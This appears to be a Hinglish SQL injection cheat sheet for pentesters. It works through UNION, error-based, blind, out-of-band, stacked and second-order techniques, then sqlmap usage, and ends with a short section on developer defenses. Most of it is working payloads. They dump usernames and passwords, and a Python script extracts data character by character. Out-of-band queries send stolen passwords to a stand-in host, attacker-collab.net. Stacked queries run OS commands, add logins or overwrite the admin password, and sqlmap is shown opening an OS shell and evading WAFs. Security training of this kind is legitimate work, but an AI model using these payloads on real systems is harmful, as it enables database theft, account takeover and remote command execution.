1. SQLi Fundamentals

SQL Injection tab hoti hai jab application user input ko directly SQL query mein concatenate kar deta hai, bina sanitize/parameterize kiye. Attacker input ke through query ki structure hi badal deta hai — result: unauthorized data access, auth bypass, ya kabhi kabhi RCE tak.

TypeKaam kaise karta haiKab use karein
UNION-basedExtra SELECT inject karke response mein hi data la dete hainJab output directly page pe reflect ho
Error-basedDB error messages mein data leak karwate hainJab verbose errors visible hon
Boolean-blindTrue/False condition se page behavior change hota haiJab output visible nahi but page differ karta hai
Time-blindSLEEP/WAITFOR se response delay measure karte hainJab kuch bhi visible difference na ho
Out-of-bandDNS/HTTP request ke through data exfiltrate hota haiJab in-band/blind dono blocked hon
Stacked queriesSemicolon se multiple statements ek saath chalate hainJab driver/DB multi-statement allow kare
Second-orderPayload store hota hai, baad mein kahi aur trigger hota haiJab input sanitize but later unsafe use ho

3. UNION-Based SQLi In-band

UNION operator do SELECT statements ke results combine karta hai. Attacker apna khud ka SELECT inject karta hai taaki data normal output ke saath display ho jaye. Requirement: column count same, data types compatible.

Step-by-Step

1
Confirm injectable
id=1'
id=1"
id=1)
id=1--
2
Column count (ORDER BY)
' ORDER BY 1--+
' ORDER BY 2--+
' ORDER BY 3--+   ← error aaya to pichhla number sahi hai
3
UNION accept confirm karo
' UNION SELECT NULL,NULL,NULL--+
4
Reflecting column dhundo
' UNION SELECT 1,2,3--+
5
DB info gather karo
' UNION SELECT database(),user(),version()--+
6
Table/column enumeration
' UNION SELECT table_name,2,3 FROM information_schema.tables 
  WHERE table_schema=database()--+

' UNION SELECT column_name,2,3 FROM information_schema.columns 
  WHERE table_name='users'--+
7
Data extract karo
' UNION SELECT username,password,3 FROM users--+

Multiple rows / limited columns handle karna

-- GROUP_CONCAT se sab rows ek saath
' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR '
'),2,3 
  FROM users--+

-- Jab sirf 1 column reflect ho
' UNION SELECT CONCAT(username,'::',password,'::',email) FROM users--+

-- Row-by-row (jab GROUP_CONCAT truncate ho jaye)
' UNION SELECT username,password,3 FROM users LIMIT 1 OFFSET 0--+

4. Error-Based SQLi In-band

Jab application verbose DB errors return karta hai, attacker error message ke andar hi data leak karwa sakta hai — ye tab useful hai jab UNION possible na ho (column mismatch, filtering etc.) but errors visible hon.

Step-by-Step

1
Error trigger confirm karo
id=1'
Agar raw MySQL/MSSQL error page pe dikhta hai → error-based candidate
2
Data ko error message mein force karo (MySQL — extractvalue/updatexml XPath error abuse karte hain)
3
Extracted string ko error output se read karo

MySQL Error-based Payloads

-- extractvalue() XPath error trick
' AND extractvalue(1,concat(0x7e,(SELECT database())))--+

-- updatexml() variant
' AND updatexml(1,concat(0x7e,(SELECT user())),1)--+

-- Table names via error
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM 
  information_schema.tables LIMIT 1)))--+

-- Double query error (older MySQL)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(
  (SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM 
  information_schema.tables GROUP BY x)a)--+

MSSQL Error-based Payloads

-- Conversion error se data leak
' AND 1=CONVERT(int,(SELECT @@version))--+

' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM 
  information_schema.tables))--+

PostgreSQL Error-based

' AND 1=CAST((SELECT version()) AS int)--+

Oracle Error-based

' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version 
  WHERE rownum=1))--+

5. Boolean-Based Blind SQLi

Jab response mein data visible nahi hota lekin page ka behavior (content, length, presence of an element) query ke true/false result ke hisaab se badalta hai.

Step-by-Step

1
Baseline true/false compare karo
' AND 1=1--+   (normal page — TRUE)
' AND 1=2--+   (different/empty page — FALSE)
2
Character-by-character extraction — condition ko data pe base karo
' AND SUBSTRING(database(),1,1)='a'--+
' AND SUBSTRING(database(),1,1)='b'--+
... (a-z, 0-9 try karte jao har position ke liye)
3
ASCII-based comparison (faster, binary search ke saath automate ho sakta hai)
' AND ASCII(SUBSTRING(database(),1,1))>77--+
' AND ASCII(SUBSTRING(database(),1,1))=109--+
4
Table/column existence check
' AND (SELECT COUNT(*) FROM users)>0--+
' AND (SELECT COUNT(*) FROM information_schema.tables 
  WHERE table_name='admin')>0--+

Automation logic (binary search se fast)

# Python pseudo-logic for boolean blind extraction
import requests

def get_char(position):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"' AND ASCII(SUBSTRING(database(),{position},1))>{mid}--+"
        r = requests.get(f"https://target.com/page?id=1{payload}")
        if "Welcome" in r.text:   # TRUE condition indicator
            low = mid + 1
        else:
            high = mid
    return chr(low)

result = "".join(get_char(i) for i in range(1, 20))
print(result)

6. Time-Based Blind SQLi

Jab response mein koi visible difference hi nahi hota (same content har condition mein) — tab response delay measure karke true/false confirm karte hain.

Step-by-Step

1
Baseline delay confirm karo
' AND SLEEP(5)--+          -- MySQL
'; WAITFOR DELAY '0:0:5'--+  -- MSSQL
' AND pg_sleep(5)--+        -- PostgreSQL
' AND dbms_lock.sleep(5)=1--+  -- Oracle
Agar response 5 sec delay ho gaya → confirmed time-blind SQLi
2
Conditional time delay se data extract karo
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--+
' AND IF(ASCII(SUBSTRING(database(),1,1))>77,SLEEP(5),0)--+
3
MSSQL conditional
IF (SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1)='a') 
  WAITFOR DELAY '0:0:5'--+

Advanced — heavy query based delay (jab SLEEP() blocked ho)

-- MySQL heavy query delay trick (SLEEP filter bypass)
' AND (SELECT COUNT(*) FROM information_schema.columns A, 
  information_schema.columns B, information_schema.columns C)--+

7. Out-of-Band (OOB) SQLi

Jab in-band aur blind dono possible na hon (firewall response block kar deta hai ya bohot slow hai), tab DNS/HTTP request ke through data attacker-controlled server pe bhejte hain.

Step-by-Step

1
OOB listener setup karo — Burp Collaborator ya khud ka DNS server (interactsh, dnslog.cn)
2
DB se DNS lookup trigger karwao data ke saath
3
Collaborator/listener pe incoming request check karo — subdomain mein data encoded hoga

MSSQL

'; DECLARE @data VARCHAR(1024);
SELECT @data=(SELECT TOP 1 password FROM users);
EXEC('master..xp_dirtree "\\'+@data+'.attacker-collab.net\\a"')--+

Oracle

' UNION SELECT UTL_HTTP.REQUEST('http://'||(SELECT password 
  FROM users WHERE rownum=1)||'.attacker-collab.net') FROM dual--+

MySQL (limited, needs specific privileges)

' UNION SELECT LOAD_FILE(CONCAT('\\\\',
  (SELECT password FROM users LIMIT 1),
  '.attacker-collab.net\\a'))--+
OOB technique advanced hai aur mostly authorized red team engagements mein use hoti hai jaha network egress allowed ho. Bug bounty mein Burp Collaborator best tool hai isko detect karne ke liye.

8. Stacked Queries SQLi

Kuch DB drivers (MSSQL, PostgreSQL, PHP PDO with multi-statement) semicolon se separate multiple statements ek saath execute karne dete hain — attacker ek query ke baad completely alag statement (INSERT/UPDATE/DROP/EXEC) chala sakta hai.

Step-by-Step

1
Stacked query support confirm karo
1'; SELECT 1--+
Agar error nahi aaya aur behavior change hua → stacked queries possible
2
Harmless test se confirm karo (time delay)
1'; WAITFOR DELAY '0:0:5'--+
3
Actual impact karo (sirf authorized scope mein, minimum necessary)

MSSQL

-- Command execution (agar xp_cmdshell enabled)
'; EXEC xp_cmdshell('whoami')--+

-- New admin user create karna (impact demo ke liye, PoC only)
'; EXEC sp_addlogin 'hacker','Password123'--+

-- Data modify
'; UPDATE users SET password='hacked' WHERE username='admin'--+

PostgreSQL

-- Command execution via COPY TO PROGRAM (superuser required)
'; COPY (SELECT '') TO PROGRAM 'id'--+

-- Data insert
'; INSERT INTO users(username,password) VALUES('hacker','pass123')--+
Stacked queries se DROP/UPDATE/DELETE jaisi destructive commands avoid karo authorized test mein bhi — sirf non-destructive PoC (jaise SELECT/WAITFOR) use karo jab tak scope explicitly allow na kare.

9. Second-Order SQLi

Payload turant execute nahi hota — pehle safely store hota hai (e.g. registration form ka "name" field), aur baad mein kisi aur function/page mein us data ko unsafe tarike se query mein use kiya jata hai, jaha injection trigger hoti hai.

Step-by-Step

1
Input jo store hota hai identify karo — username, display name, address, profile bio
2
Payload waha submit karo
Username: admin'--
3
App ke andar dusri jagah dhundo jaha ye stored value dobara query mein use hoti hai — jaise "change password", "view profile", "admin panel search"
4
Us dusri feature ko trigger karo aur dekho ki stored payload execute hui ya nahi

Classic Example

-- Step 1: Registration ke waqt username field mein
Username: admin'--

-- Step 2: Backend jab "change password" query banata hai:
UPDATE users SET password='newpass' WHERE username='admin'--'

-- Yaha '-- ne baaki query comment kar diya,
-- effectively admin ka password change ho gaya bina uska password 
-- verify kiye (agar WHERE clause mein password check tha)
Second-order SQLi manual testing mein miss ho jati hai kyunki automated scanners aksar sirf immediate response check karte hain, stored-then-triggered flow nahi follow karte. Application ko end-to-end manually walk-through karna zaroori hai.

11. sqlmap Automation

# Basic scan (auto-detects technique)
sqlmap -u "https://target.com/page?id=1" --batch

# Force specific technique
sqlmap -u "https://target.com/page?id=1" --technique=U --batch   # UNION
sqlmap -u "https://target.com/page?id=1" --technique=E --batch   # Error
sqlmap -u "https://target.com/page?id=1" --technique=B --batch   # Boolean
sqlmap -u "https://target.com/page?id=1" --technique=T --batch   # Time
sqlmap -u "https://target.com/page?id=1" --technique=S --batch   # Stacked

# Column count already known
sqlmap -u "https://target.com/page?id=1" --union-cols=3 --technique=U

# Databases / tables / columns / dump
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" -D dbname --tables
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --columns
sqlmap -u "https://target.com/page?id=1" -D dbname -T users -C username,password --dump

# Cookie / POST / header injection
sqlmap -u "https://target.com/page" --cookie="session=abc123*" --batch
sqlmap -r request.txt --batch --technique=U
sqlmap -u "https://target.com/page?id=1" --headers="X-Forwarded-For: 1*"

# OS shell (agar stacked + privileges allow karein)
sqlmap -u "https://target.com/page?id=1" --os-shell

# WAF/tamper evasion
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,charencode --random-agent

# Risk/level increase (deeper testing, more payloads)
sqlmap -u "https://target.com/page?id=1" --level=5 --risk=3

12. Defense / Prevention Developer Side

1
Parameterized Queries / Prepared Statements — user input query string mein kabhi directly concatenate na ho
2
ORM frameworks use karo jo auto-escape karte hain
3
Least privilege — DB user ko sirf zaroori permissions (no FILE, no DROP)
4
Input validation — whitelist-based, expected type enforce karo
5
Generic error messages — DB errors user ko show mat karo
6
WAF extra layer ke roop mein, primary defense nahi
7
Second-order ke liye — har jagah input use ho raha hai wahan parameterize karo, sirf entry point pe nahi
